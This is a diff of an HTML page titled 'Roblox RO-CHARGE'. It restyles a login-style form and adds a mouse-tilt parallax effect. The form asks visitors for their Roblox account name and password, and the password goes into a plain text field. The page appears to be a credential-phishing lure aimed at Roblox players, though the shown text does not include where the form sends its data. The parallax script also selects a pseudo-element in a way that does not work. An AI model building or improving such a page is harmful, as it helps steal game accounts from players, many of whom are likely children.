@@ -5,41 +5,69 @@
     <title>Roblox RO-CHARGE</title>
     <style>
         body {
-            background-image: url('https://github.com/rocharge/Roblox-RO-CHARGE/blob/main/peakpx.jpg');
-            background-size: cover;
-            background-repeat: no-repeat;
-            color: white;
-            font-family: Arial, sans-serif;
+            margin: 40px 0;
+            font-family: "Raleway";
+            font-size: 14px;
+            font-weight: 500;
+            background-color: #BCAAA4;
+            -webkit-font-smoothing: antialiased;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            perspective: 1000px; /* Добавили перспективу */
         }
-        form {
-            background: rgba(255, 255, 255, 0.1); /* Полупрозрачный белый фон */
-            padding: 20px;
+
+        .form-container {
+            position: relative;
+            width: 400px;
+            padding: 40px 80px;
+            background: rgba(255, 255, 255, 0.02); /* Полупрозрачный белый фон */
             border-radius: 10px;
             backdrop-filter: blur(10px);
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: rgba(255, 255, 255, 0.2) 0 0 40px 5px, white 0 0 0 1px, rgba(0, 0, 0, 0.66) 0 30px 60px 0, inset #333 0 0 0 5px, inset white 0 0 0 6px;
+            transition: transform 0.2s ease;
+            overflow: hidden; /* Чтобы изображение оставалось внутри формы */
         }
+
+        .form-container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://github.com/rocharge/Roblox-RO-CHARGE/raw/main/roblox-1920X1080-wallpaper-6oivigztd16zyyy0.jpg');
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px); /* Размытое изображение */
+            transition: transform 0.2s ease;
+        }
+
+        form {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
         label {
             display: block;
             margin-bottom: 10px;
+            font-size: 18px;
         }
-        textarea,
-        input[type="email"] {
+
+        input[type="text"] {
             width: 100%;
             padding: 10px;
             border-radius: 10px;
             border: 1px solid #ccc;
             background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(10px);
             box-sizing: border-box;
             margin-bottom: 10px;
         }
+
         button {
             width: 100%;
             padding: 10px;
@@ -50,22 +78,45 @@
             font-size: 16px;
             cursor: pointer;
         }
+
         button:hover {
             background-color: #005bb5;
         }
     </style>
 </head>
 <body>
-    <form>
-        <label>
-            Enter your Roblox account name:
-            <textarea name="username" required></textarea>
-        </label>
-        <label>
-            Enter your Roblox account password:
-            <textarea name="password" required></textarea>
-        </label>
-        <button type="submit">Отправить</button>
-    </form>
+    <div class="form-container" id="form-container">
+        <form id="form">
+            <label for="username">Enter your Roblox account name:</label>
+            <input id="username" type="text" name="username" required>
+            
+            <label for="password">Enter your Roblox account password:</label>
+            <input id="password" type="text" name="password" required>
+            
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        const formContainer = document.getElementById('form-container');
+
+        formContainer.addEventListener('mousemove', (e) => {
+            const { width, height } = formContainer.getBoundingClientRect();
+            const { offsetX, offsetY } = e;
+            const rotateX = ((offsetY / height) - 0.5) * -10; // Используем отрицательные значения для смещения от курсора
+            const rotateY = ((offsetX / width) - 0.5) * 10;
+            formContainer.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+
+            // Параллакс-эффект для изображения
+            const parallaxX = ((offsetX / width) - 0.5) * 20;
+            const parallaxY = ((offsetY / height) - 0.5) * 20;
+            formContainer.querySelector('::before').style.transform = `translate(${parallaxX}px, ${parallaxY}px) scale(1.1)`;
+        });
+
+        formContainer.addEventListener('mouseleave', () => {
+            formContainer.style.transform = 'rotateX(0) rotateY(0)';
+            formContainer.querySelector('::before').style.transform = 'translate(0, 0) scale(1)';
+        });
+    </script>
 </body>
 </html>
